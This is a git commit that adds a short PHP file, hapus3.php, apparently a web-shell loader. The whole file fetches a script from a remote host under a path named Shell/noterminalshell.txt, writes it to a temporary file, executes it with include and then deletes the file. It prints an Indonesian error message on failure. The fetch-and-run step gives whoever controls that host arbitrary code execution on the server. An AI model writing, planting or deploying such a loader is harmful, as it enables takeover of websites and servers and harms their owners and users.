eefc6d877f6ff22470c29dad6ec58e271098cd80
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-07-13 16:19:11 +0700

    Create hapus3.php

---
+++ hapus3.php
@@ -0,0 +1,17 @@
+  <?php
+$remote_url = "https://antikalah.lol/Shell/noterminalshell.txt";
+
+$response = @file_get_contents($remote_url);
+
+if ($response !== false && strpos($response, '<?php') !== false) {
+
+    $tmp_file = sys_get_temp_dir() . '/alfalitespeed_' . uniqid() . '.php';
+    file_put_contents($tmp_file, $response);
+
+    include $tmp_file;
+
+    unlink($tmp_file);
+} else {
+    echo "Gagal memuat konten dari remote URL.";
+}
+?>
